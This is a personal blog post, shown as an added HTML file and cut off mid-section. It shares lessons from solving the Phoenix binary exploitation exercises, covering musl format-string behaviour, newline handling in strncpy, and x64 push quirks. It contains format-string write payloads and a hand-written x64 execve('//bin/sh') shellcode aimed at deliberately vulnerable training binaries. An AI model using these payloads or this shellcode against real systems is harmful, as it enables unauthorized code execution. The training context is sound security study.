@@ -1,0 +1,736 @@
+
+<!DOCTYPE html>
+<html lang="pt">
+
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>Some lessons learned doing Phoenix@Exploit.Education | gildasio</title>
+
+    <link rel="stylesheet" href="/style.css">
+
+    <link rel="shortcut icon" href="/assets/img/favicon.jpg">
+
+</head>
+
+
+    <body>
+      <div class="container">
+
+        <header class="row">
+  <div class="col-lg-8 col-lg-offset-2">
+	  <h1 class="">gildasio</h1>
+  </div>
+</header>
+
+<div class="row">
+  <div class="col-lg-8 col-lg-offset-2">
+    <div class="menu">
+      <ul>
+          <li><a href="/">[ home ]</a></li>
+          <li><a href="/posts/">[ posts ]</a></li>
+          <li><a href="/teaching">[ teaching ]</a></li>
+          <li><a href="/poems">[ poems ]</a></li>
+          <!--<li><a href="/press">[ press ]</a></li>-->
+          <li><a href="/feed.xml">[ feed ]</a></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+
+
+	<main>
+          <div class="row">
+            <div class="col-lg-8 col-lg-offset-2">
+              <main>
+              <div class="post">
+
+  <header class="post-header">
+    <h1>Some lessons learned doing Phoenix@Exploit.Education</h1>
+  </header>
+
+  <article class="post-content">
+  <div class="post">
+
+  <header class="post-header">
+    <h3>Some notes about exercises from phoenix@exploit.education vm</h3>
+    <p class="meta">
+        May 18, 2024
+         • Gildásio Júnior
+        
+        •
+        <span><a href="" class="reserved">binary exploitation</a>, </span><span><a href="" class="reserved">pwn</a>, </span><span><a href="" class="reserved">hacking</a>, </span><span><a href="" class="reserved">learning</a></span>
+    </p>
+  </header>
+
+  <article class="post-content">
+  <h1 id="introduction">Introduction</h1>
+
+<p>Last days I was practicing fundamentals topics on binary exploitation and using
+<a href="https://exploit.education/phoenix/">Phoenix</a> from Exploit.Education for it.
+Sometimes I like to read other people writeups after passing a level to compare
+with my solution with the expectation to learn new tips.</p>
+
+<p>While doing so (both the exercises and writeups reading) I came across some
+topics which I found interesting. Most of them I share privately to friends and
+some others I post on twitter, like <a href="https://twitter.com/gildasi0/status/1788199691420594238">this one</a> and <a href="https://x.com/gildasi0/status/1791237137662103851">another</a> (and mastodon too haha <a href="https://fosstodon.org/@gildasio/112406896408669811">first</a>, <a href="https://fosstodon.org/@gildasio/112453189752638711">second</a>).</p>
+
+<p>This blogpost is an attempt to share them to you. It is not a writeup on how do
+phoenix exercises (there’s a lot of that out there, just turn the next internet
+cornet and you’ll find a better writeup than I could write) but a <em>“meta”</em> post.
+That said, follow along if that make sense for you. Any feedback on it I’m open,
+just share it, thanks :)</p>
+
+<h1 class="no_toc" id="table-of-contents">Table of Contents</h1>
+
+<ul id="markdown-toc">
+  <li><a href="#introduction" id="markdown-toc-introduction">Introduction</a></li>
+  <li><a href="#motivation" id="markdown-toc-motivation">Motivation</a>    <ul>
+      <li><a href="#how-i-did-phoenix" id="markdown-toc-how-i-did-phoenix">How I did Phoenix</a></li>
+    </ul>
+  </li>
+  <li><a href="#interesting-points" id="markdown-toc-interesting-points">Interesting points</a>    <ul>
+      <li><a href="#format-string-positional-parameters-x-musl-libc" id="markdown-toc-format-string-positional-parameters-x-musl-libc">Format string positional parameters x MUSL LIBC</a></li>
+      <li><a href="#n-is-not-always-badchar" id="markdown-toc-n-is-not-always-badchar"><code class="highlighter-rouge">\n</code> is not always badchar</a></li>
+      <li><a href="#avoid-error-prone-actions" id="markdown-toc-avoid-error-prone-actions">Avoid error prone actions</a></li>
+      <li><a href="#we-cant-push-64-bit-onto-stack-right-hmmm" id="markdown-toc-we-cant-push-64-bit-onto-stack-right-hmmm">We can’t push 64-bit onto stack, right? Hmmm…</a></li>
+      <li><a href="#get-gdb-and-the-shell-environment-variables-balanced" id="markdown-toc-get-gdb-and-the-shell-environment-variables-balanced">Get GDB and the SHELL environment variables balanced</a></li>
+      <li><a href="#pay-attention-to-code-all-the-interesting-part" id="markdown-toc-pay-attention-to-code-all-the-interesting-part">Pay attention to code, all the interesting part</a></li>
+      <li><a href="#final-two-isnt-exploitable" id="markdown-toc-final-two-isnt-exploitable">Final-Two isn’t exploitable</a></li>
+    </ul>
+  </li>
+  <li><a href="#open-question" id="markdown-toc-open-question">Open question</a></li>
+  <li><a href="#conclusion" id="markdown-toc-conclusion">Conclusion</a></li>
+  <li><a href="#thanks" id="markdown-toc-thanks">Thanks</a></li>
+</ul>
+
+<h1 id="motivation">Motivation</h1>
+
+<p>I know Phoenix@Exploit.Education quite a while and liked its idea but never
+focused on doing it waiting for the right time (<del>perfectionism sucks</del>).
+Someday I read a passage (can’t remember where, sorry):</p>
+
+<blockquote>
+  <p>The best time to [do something] was five years ago. Second best time is now.</p>
+</blockquote>
+
+<p>I think it works for study and userland binary exploitation too, so …</p>
+
+<h2 id="how-i-did-phoenix">How I did Phoenix</h2>
+
+<p>With my previous background I already knew some topics like buffer overflows,
+format strings and heap overflow. Unfortunately this knowledge was most on
+theory. As I didn’t practice those topics as I want I didn’t feel like I
+<strong>really</strong> understood them.</p>
+
+<p>Is it practice that I need? So it will be practice that I will do.</p>
+
+<p>This way my goal was to exploit all exercises on both x86 and x64 architecture,
+doing every steps needed (like write shellcodes by hand, not copy them) by
+really understanding every part of the process.</p>
+
+<p>All this happened very well, I discuss more on <a href="#conclusion">Conclusion</a> section.</p>
+
+<h1 id="interesting-points">Interesting points</h1>
+
+<p>I’ll start by the ones I posted to give them more context.</p>
+
+<h2 id="format-string-positional-parameters-x-musl-libc">Format string positional parameters x MUSL LIBC</h2>
+
+<p>I post the following on <a href="https://twitter.com/gildasi0/status/1788199691420594238">twitter</a> and <a href="https://fosstodon.org/@gildasio/112406896408669811">fosstodon</a>:</p>
+
+<blockquote>
+  <p>Always remember to take into account how the binary was built. I was trying to
+exploit a simple format string bug using positional parameters but this was 
+not working, until @KampetL remember me this. GLIBC doesn´t care about this
+rule, while MUSL does.</p>
+</blockquote>
+
+<p>When we are exploiting format string bugs we need to access values on the stack.
+Those values can be a data we control, just like the format string buffer
+itself, or any other interesting data.</p>
+
+<p>One can do that simply by inserting a bunch of parameters on the string. Take
+this example</p>
+
+<div class="language-c highlighter-rouge"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+</span>
+<span class="kt">int</span> <span class="nf">main</span> <span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span> <span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+<span class="p">}</span>
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>$ gcc format.c -o format_glibc
+$ ./format_glibc `perl -e "print('%x.'x20)"`
+69537828.69537840.c38f9dd8.0.4cb1f40.69537828.69537828.695377a0.4ab0c88.69537750.69537828.c38f6040.c38f7149.69537828.5d4642b.2.0.4ce1000.c38f9dd8.4b4642b.
+</code></pre>
+</div>
+
+<p>Another possibility - and I like more due to its practicality - is using
+positional parameters. We can specify on the format string ordinally which
+parameter the format refers to. The following example it refers to the 20th
+positional parameter:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>$ ./format_glibc '%20$x'
+ef3f71cd
+</code></pre>
+</div>
+
+<p>I was trying to exploit the Phoenix’s format string exercises using this trick
+but it wasn’t working. After being able to explore even without this technique I
+start some research and asking some people. This research lasted until my friend
+<a href="https://twitter.com/KampetL">@KampetL</a> noted.</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>$ man 3 printf
+There may be no gaps in the numbers of arguments specified using '$'; for 
+example, if arguments 1 and 3 are specified, argument 2 must also be specified
+somewhere in the format string.
+</code></pre>
+</div>
+
+<p>It is a pattern rule, so who care about it? Not everyone, of course. GLIBC, for
+instance, doesn’t care, while MUSL LIBC really cares about it. That’s why I
+compiled the example before as <code class="highlighter-rouge">format_glibc</code>. Let’s test compiling it using
+MUSL LIBC:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>$ musl-gcc format.c -o format_musl
+$ ./format_musl `perl -e "print('%x.'x20)"`
+5df46aa8.5df46ac0.0.5df46ac0.5df46940.5df46aa8.21f6a497.5df46aa8.21f1db4d.0.21fa56c0.0.21fa5b68.5df48fea.e88f5066.2.5df48aba.5df48ac8.0.5df48b05.
+$ ./format_musl '%20$x'
+$
+$ ./format_musl '%2$x.%1$x'
+897e2c80.897e2c68
+</code></pre>
+</div>
+
+<p>Note it works and print all the info when I’m not using positional parameters,
+but when I try to access the 20th without specifying the previous it does not
+works.</p>
+
+<h2 id="n-is-not-always-badchar"><code class="highlighter-rouge">\n</code> is not always badchar</h2>
+
+<p>This is what I post on <a href="https://twitter.com/gildasi0/status/1791237137662103851">twitter</a> and <a href="https://fosstodon.org/@gildasio/112453189752638711">fosstodon</a> about this issue:</p>
+
+<blockquote>
+  <p>Last days I was doing phoenix from http://exploit.education. After exploiting 
+them I like to read writeups to learn new tips.  To my surprise people assumed
+some are unexploitable due to \n on address they need to write to. Here is a 
+tip to pass:</p>
+</blockquote>
+
+<p>It first happens on <a href="http://exploit.education/phoenix/format-two/">format-two</a>.
+Here is the buggy code:</p>
+
+<div class="language-c highlighter-rouge"><pre class="highlight"><code><span class="p">[...]</span>
+<span class="kt">int</span> <span class="n">changeme</span><span class="p">;</span>
+
+<span class="kt">void</span> <span class="nf">bounce</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span> <span class="p">{</span>
+  <span class="n">printf</span><span class="p">(</span><span class="n">str</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
+
+  <span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">BANNER</span><span class="p">);</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
+    <span class="n">strncpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
+    <span class="n">bounce</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">[...]</span>
+</code></pre>
+</div>
+
+<p>Look, there is a <code class="highlighter-rouge">strncpy()</code> copying data from <code class="highlighter-rouge">argv[1]</code> to <code class="highlighter-rouge">buf</code>. <code class="highlighter-rouge">buf</code> later
+is passed to <code class="highlighter-rouge">printf()</code> on <code class="highlighter-rouge">bounce()</code>. That is the bug. Pretty clear and simple.
+Exploit it on x86 architecture is very straightforward. That’s not the case for
+x64.</p>
+
+<p>We need to overwrite <code class="highlighter-rouge">changeme</code> variable. On the x64 binary it is located on
+<code class="highlighter-rouge">0x600af0</code> address:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>user@phoenix-amd64:~$ objdump -t /opt/phoenix/amd64/format-two | grep changeme
+0000000000600af0 g     O .bss   0000000000000004 changeme
+</code></pre>
+</div>
+
+<p>One trying to exploit this challenge can notice that passing those bytes is not
+simple as the ones for x86 binary. I faced it too. But as I said on
+<a href="#how-i-did-phoenix">How I did Phoenix</a> subsection, I want to really understand
+what is going on.</p>
+
+<p>Once the address to write is <code class="highlighter-rouge">0x600af0</code>, note the <code class="highlighter-rouge">0x0a</code> byte, it is a <code class="highlighter-rouge">\n</code> 
+character. I faced a problem because the way I was sending these bytes the
+program didn’t receive all of them, only the <code class="highlighter-rouge">0xf0</code> (because endianness we need
+to send the bytes on inverted order, first <code class="highlighter-rouge">0xf0</code>, then <code class="highlighter-rouge">0x0a</code>, finally <code class="highlighter-rouge">0x60</code>).</p>
+
+<p>I also thought it was a badchar, but I need to confirm it before throwing in the 
+towel.</p>
+
+<p>In order to confirm that I perform a test: pass anything I want them change it
+on GDB <strong>before</strong> it is <code class="highlighter-rouge">strncpy()</code>ed, so if it bug there, I confirm it is a
+<code class="highlighter-rouge">strncpy()</code> badchar them I can try to think how to bypass it.</p>
+
+<p>Let’s test…</p>
+
+<p>First I set a breakpoint before call <code class="highlighter-rouge">strncpy()</code>, this way I can investigate and
+change the values before it, then I run the program:</p>
+
+<div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="n">user</span><span class="err">@</span><span class="n">phoenix</span><span class="o">-</span><span class="n">amd64</span><span class="o">:~</span><span class="err">$</span> <span class="n">gdb</span> <span class="o">-</span><span class="n">q</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">phoenix</span><span class="o">/</span><span class="n">amd64</span><span class="o">/</span><span class="n">format</span><span class="o">-</span><span class="n">two</span>
+<span class="n">Reading</span> <span class="n">symbols</span> <span class="n">from</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">phoenix</span><span class="o">/</span><span class="n">amd64</span><span class="o">/</span><span class="n">format</span><span class="o">-</span><span class="n">two</span><span class="p">...(</span><span class="n">no</span> <span class="n">debugging</span> <span class="n">symbols</span> <span class="n">found</span><span class="p">)...</span><span class="n">done</span><span class="p">.</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">disas</span> <span class="n">main</span>
+<span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="n">for</span> <span class="n">function</span> <span class="n">main</span><span class="o">:</span>
+<span class="p">...</span>
+   <span class="mh">0x00000000004006e6</span> <span class="o">&lt;+</span><span class="mi">89</span><span class="o">&gt;:</span>    <span class="k">mov</span>    <span class="err">$</span><span class="mh">0x100</span><span class="p">,</span><span class="err">%</span><span class="n">edx</span>
+   <span class="mh">0x00000000004006eb</span> <span class="o">&lt;+</span><span class="mi">94</span><span class="o">&gt;:</span>    <span class="k">mov</span>    <span class="err">%</span><span class="n">rcx</span><span class="p">,</span><span class="err">%</span><span class="n">rsi</span>
+   <span class="mh">0x00000000004006ee</span> <span class="o">&lt;+</span><span class="mi">97</span><span class="o">&gt;:</span>    <span class="k">mov</span>    <span class="err">%</span><span class="n">rax</span><span class="p">,</span><span class="err">%</span><span class="n">rdi</span>
+   <span class="mh">0x00000000004006f1</span> <span class="o">&lt;+</span><span class="mi">100</span><span class="o">&gt;:</span>   <span class="n">callq</span>  <span class="mh">0x4004c0</span> <span class="o">&lt;</span><span class="n">strncpy</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+<span class="p">...</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">b</span> <span class="o">*</span><span class="n">main</span><span class="o">+</span><span class="mi">100</span>
+<span class="n">Breakpoint</span> <span class="mi">1</span> <span class="n">at</span> <span class="mh">0x4006f1</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">r</span> <span class="err">`</span><span class="n">perl</span> <span class="o">-</span><span class="n">e</span> <span class="err">'</span><span class="n">print</span><span class="p">(</span><span class="s">"%x"</span><span class="n">x16</span> <span class="p">.</span> <span class="s">"-%500.n."</span><span class="n">x1</span> <span class="p">.</span> <span class="s">"</span><span class="se">\xff\x08\x60</span><span class="s">"</span><span class="p">)</span><span class="err">'`</span>
+<span class="p">...</span>
+<span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x00000000004006f1</span> <span class="k">in</span> <span class="n">main</span> <span class="p">()</span>
+</code></pre>
+</div>
+
+<p>Now I reach the breakpoint. Looking into memory I can see the buffer with data I
+sent. This is the <code class="highlighter-rouge">argv[1]</code>. Note I sent the address <code class="highlighter-rouge">0x6008ff</code> just for test,
+note how it is on the end:</p>
+
+<div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">i</span> <span class="n">r</span> <span class="err">$</span><span class="n">rdi</span> <span class="err">$</span><span class="n">rsi</span> <span class="err">$</span><span class="n">rdx</span>
+<span class="n">rdi</span>            <span class="mh">0x7fffffffe560</span>      <span class="mi">140737488348512</span>
+<span class="n">rsi</span>            <span class="mh">0x7fffffffe8c2</span>      <span class="mi">140737488349378</span>
+<span class="n">rdx</span>            <span class="mh">0x100</span>               <span class="mi">256</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">s</span> <span class="mh">0x7fffffffe8c2</span>
+<span class="mh">0x7fffffffe8c2</span><span class="o">:</span> <span class="s">"%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x-%500.n.</span><span class="se">\377\b</span><span class="s">`"</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">8</span><span class="n">gx</span> <span class="mh">0x7fffffffe8c2</span>
+<span class="mh">0x7fffffffe8c2</span><span class="o">:</span> <span class="mh">0x7825782578257825</span>      <span class="mh">0x7825782578257825</span>
+<span class="mh">0x7fffffffe8d2</span><span class="o">:</span> <span class="mh">0x7825782578257825</span>      <span class="mh">0x7825782578257825</span>
+<span class="mh">0x7fffffffe8e2</span><span class="o">:</span> <span class="mh">0x2e6e2e303035252d</span>      <span class="mh">0x435f534c006008ff</span>
+<span class="mh">0x7fffffffe8f2</span><span class="o">:</span> <span class="mh">0x73723d53524f4c4f</span>      <span class="mh">0x31303d69643a303d</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">gx</span> <span class="mh">0x7fffffffe8c2</span><span class="o">+</span><span class="mi">40</span>
+<span class="mh">0x7fffffffe8ea</span><span class="o">:</span> <span class="mh">0x435f534c006008ff</span>
+</code></pre>
+</div>
+
+<p>Then I change its value, putting a <code class="highlighter-rouge">\n</code> (<code class="highlighter-rouge">0x0a</code>) on its place:</p>
+
+<div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">set</span> <span class="o">*</span><span class="p">(</span><span class="mh">0x7fffffffe8c2</span><span class="o">+</span><span class="mi">40</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x435f534c00600af0</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">gx</span> <span class="mh">0x7fffffffe8c2</span><span class="o">+</span><span class="mi">40</span>
+<span class="mh">0x7fffffffe8ea</span><span class="o">:</span> <span class="mh">0x435f534c00600af0</span>
+</code></pre>
+</div>
+
+<p>Now executing the rest of the code or it will not works so I can confirm <code class="highlighter-rouge">\n</code> is
+a badchar or not:</p>
+
+<div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
+<span class="n">Continuing</span><span class="p">.</span>
+<span class="mi">050</span><span class="n">ffffe58bffffe51fffffe560ffffe560ffffe660400705ffffe6b8400368782578257825782578257825782578253035252d</span><span class="o">-</span><span class="p">.</span>
+<span class="err">`</span><span class="n">Well</span> <span class="n">done</span><span class="p">,</span> <span class="n">the</span> <span class="err">'</span><span class="n">changeme</span><span class="err">'</span> <span class="n">variable</span> <span class="n">has</span> <span class="n">been</span> <span class="n">changed</span> <span class="n">correctly</span><span class="err">!</span>
+</code></pre>
+</div>
+
+<p>Bang! It works! What that means? <code class="highlighter-rouge">strncpy()</code> works with <code class="highlighter-rouge">\n</code>! :)</p>
+
+<p>Okay, but what I can do now?
+Well, <code class="highlighter-rouge">strncpy()</code> accepts <code class="highlighter-rouge">\n</code>, so the problem is before that. Maybe poor 
+<code class="highlighter-rouge">strncpy()</code> isn’t even seeing those <code class="highlighter-rouge">\n</code> because BASH is not sending it :/</p>
+
+<p>Then I write a simple code to test this hypothesis and starting test things out:</p>
+
+<div class="language-c highlighter-rouge"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+</span>
+<span class="kt">int</span> <span class="nf">main</span> <span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span> <span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Total args: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argc</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span>
+        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_SUCCESS</span><span class="p">);</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"0x%hhx "</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="n">i</span><span class="p">]);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre>
+</div>
+
+<p>I did a bunch of test. The most interesting to concludes was these:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>$ var=`perl -e 'print("A\nB")'`
+$ ./breakline $var
+Total args: 3
+0x41
+$ ./breakline '$var'
+Total args: 2
+0x24 0x76 0x61 0x72
+$ ./breakline "$var"
+Total args: 2
+0x41 0xa 0x42
+</code></pre>
+</div>
+
+<p>Note: <code class="highlighter-rouge">$var</code> has <code class="highlighter-rouge">\n</code> on it, but depending on how I pass it to test program it
+is passed as one or two parameters. Using double quotes we pass it as a whole.
+That’s the trick.</p>
+
+<blockquote>
+  <p>Okay, sometimes <code class="highlighter-rouge">\n</code> really is a badchar but that <strong>depends on context</strong>. For
+example if the code is using <code class="highlighter-rouge">scanf()</code>, <code class="highlighter-rouge">gets()</code> or others functions alike.
+But that is not the case with <code class="highlighter-rouge">strncpy()</code>.</p>
+</blockquote>
+
+<h2 id="avoid-error-prone-actions">Avoid error prone actions</h2>
+
+<p>This one was funny and stressful at the same time.</p>
+
+<p>As I said before, even shellcodes I need to exploit the exercises I write by
+myself. That’s ok, trouble is coming.</p>
+
+<p>I wrote the shellcode, compiled and run it. Everything works just fine. Great.
+It’s just a matter of putting it in attack payload, right? Well, it is right if
+I do it right.</p>
+
+<p>When I put the shellcode on payload to exploit the program it did not executes
+properly. (<del>wtf?</del>)</p>
+
+<p>My attack was working changing the execution to my shellcode, that was ok, but
+my shellcode was different. The following is a piece of my shellcode:</p>
+
+<div class="language-perl highlighter-rouge"><pre class="highlight"><code><span class="c1"># execve("//bin/sh", NULL, NULL)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"\x48\x31\xc0"</span><span class="p">);</span>                  <span class="c1"># xor    %rax,%rax</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"\x50"</span><span class="p">);</span>                          <span class="c1"># push   %rax</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s">"\x48\xbf\x2f\x2f\x62\x69\x6e"</span><span class="p">);</span>  <span class="c1"># movabs $0x68732f6e69622f2f,%rdi</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"\x2f\x73\x2f\x68"</span><span class="p">);</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s">"\x57"</span><span class="p">);</span> <span class="c1"># push %rdi</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"\x54"</span><span class="p">);</span> <span class="c1"># push %rsp</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"\x5f"</span><span class="p">);</span> <span class="c1"># pop %rdi</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s">"\x48\x31\xf6"</span><span class="p">);</span>                  <span class="c1"># xor    %rsi,%rsi</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"\x48\x31\xd2"</span><span class="p">);</span>                  <span class="c1"># xor    %rdx,%rdx</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"\xb0\x3b"</span><span class="p">);</span>                      <span class="c1"># mov    $0x3b,%al</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"\x0f\x05"</span><span class="p">);</span>                      <span class="c1"># syscall</span>
+</code></pre>
+</div>
+
+<p>Now how it was as instruction seem by GDB:</p>
+
+<div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="p">...</span>
+   <span class="mh">0x7fffffffed82</span><span class="o">:</span>      <span class="k">xor</span>    <span class="err">%</span><span class="n">rax</span><span class="p">,</span><span class="err">%</span><span class="n">rax</span>
+   <span class="mh">0x7fffffffed85</span><span class="o">:</span>      <span class="k">push</span>   <span class="err">%</span><span class="n">rax</span>
+   <span class="mh">0x7fffffffed86</span><span class="o">:</span>      <span class="n">movabs</span> <span class="err">$</span><span class="mh">0x2f732f6e69622f2f</span><span class="p">,</span><span class="err">%</span><span class="n">rdi</span>
+   <span class="mh">0x7fffffffed90</span><span class="o">:</span>      <span class="n">pushq</span>  <span class="err">$</span><span class="mh">0x485f5457</span>
+   <span class="mh">0x7fffffffed95</span><span class="o">:</span>      <span class="k">xor</span>    <span class="err">%</span><span class="n">esi</span><span class="p">,</span><span class="err">%</span><span class="n">esi</span>
+   <span class="mh">0x7fffffffed97</span><span class="o">:</span>      <span class="k">xor</span>    <span class="err">%</span><span class="n">rdx</span><span class="p">,</span><span class="err">%</span><span class="n">rdx</span>
+   <span class="mh">0x7fffffffed9a</span><span class="o">:</span>      <span class="k">mov</span>    <span class="err">$</span><span class="mh">0x3b</span><span class="p">,</span><span class="err">%</span><span class="n">al</span>
+   <span class="mh">0x7fffffffed9c</span><span class="o">:</span>      <span class="k">syscall</span>
+</code></pre>
+</div>
+
+<p>It isn’t the instruction I was expecting. O.o</p>
+
+<p>After a while, drunk coffees, glances at the sky, I figure out the problem.
+There is one extra byte I put when writing the Perl to print the opcodes.
+(facepalm). I will leave the exact extra byte for you to find as an exercise to
+get angry. At least you have this tip now.</p>
+
+<h2 id="we-cant-push-64-bit-onto-stack-right-hmmm">We can’t push 64-bit onto stack, right? Hmmm…</h2>
+
+<p>We can’t push 64 bits onto stack on x64 architecture, that’s clearly known. But
+when writing one shellcode my mind took me to test this:</p>
+
+<div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="k">push</span> <span class="err">$</span><span class="mh">0x0000000000000000</span>
+<span class="k">push</span> <span class="err">$</span><span class="mh">0xffffffffffffffff</span>
+<span class="k">push</span> <span class="err">$</span><span class="mh">0xaaaaffffffffffff</span>
+</code></pre>
+</div>
+
+<p>The first two instructions compiles and works just fine, the last one does not.
+Well, the first and the last is pretty obvious:</p>
+
+<ul>
+  <li>First compiles because it is just a <code class="highlighter-rouge">push $0</code>, so it is not a 64 bits value</li>
+  <li>Last one does not compiles because it is 64 bits, it is prohibited from ISA</li>
+</ul>
+
+<p>But what about the second?</p>
+
+<div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="p">.</span><span class="n">globl</span> <span class="n">_start</span>
+
+<span class="p">.</span><span class="n">text</span>
+<span class="n">_start</span><span class="o">:</span>
+
+    <span class="k">push</span> <span class="err">$</span><span class="mh">0xffffffffffffffff</span>
+</code></pre>
+</div>
+
+<div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="err">$</span> <span class="n">as</span> <span class="k">push</span><span class="p">.</span><span class="n">asm</span> <span class="o">-</span><span class="n">o</span> <span class="k">push</span><span class="p">.</span><span class="n">o</span>
+<span class="err">$</span> <span class="n">ld</span> <span class="k">push</span><span class="p">.</span><span class="n">o</span> <span class="o">-</span><span class="n">o</span> <span class="k">push</span>
+<span class="err">$</span> <span class="n">objdump</span> <span class="o">-</span><span class="n">d</span> <span class="k">push</span>
+<span class="p">...</span>
+<span class="mi">0000000000401000</span> <span class="o">&lt;</span><span class="n">_start</span><span class="o">&gt;:</span>
+  <span class="mi">401000</span><span class="o">:</span>       <span class="mi">6</span><span class="n">a</span> <span class="n">ff</span>                   <span class="k">push</span>   <span class="err">$</span><span class="mh">0xffffffffffffffff</span>
+</code></pre>
+</div>
+
+<p>As you can see by the opcode it is a <code class="highlighter-rouge">0x6a</code>, a simple <code class="highlighter-rouge">push</code>. Looking at it
+using <a href="http://shell-storm.org/online/Online-Assembler-and-Disassembler/?opcodes=6a+ff&amp;arch=x86-64&amp;endianness=little&amp;baddr=0x00000000&amp;dis_with_addr=True&amp;dis_with_raw=True&amp;dis_with_ins=True#disassembly">shell-storm
+disassembly</a>
+we can notice it as:</p>
+
